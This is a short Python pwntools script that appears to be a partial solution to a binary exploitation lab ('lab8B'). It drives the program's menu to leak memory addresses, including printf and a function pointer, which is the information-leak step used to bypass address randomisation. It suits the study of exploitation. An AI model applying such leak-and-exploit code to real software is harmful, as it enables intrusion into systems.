from pwn import *
settings = {
    # Path to binary
    "binary"        : "/levels/lab08/lab8B",
}
def exploit():
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    leak = p.recv()
    printf_addr = u32(leak[0x0:0x4])
    print("Leaked printf() address: ",hex(printf_addr))
    p.sendline("1")
    p.sendline("1")
    p.sendline("A")
    p.sendline("2")
    p.sendline("3")
    p.sendline("4")
    p.sendline("5")
    p.sendline("6")
    p.sendline("7")
    p.sendline("8")
    p.sendline("9")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    v1_addr = int(p.recvline().split(" ")[1].strip(),16)
    print_vector_addr = int(p.recvline().split(" ")[2].strip(),16)
    print("Leaked v1() address: ",hex(v1_addr))
    print("Leaked printFunc() address: ",hex(print_vector_addr))
# Initial setup
if __name__  == "__main__":
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()
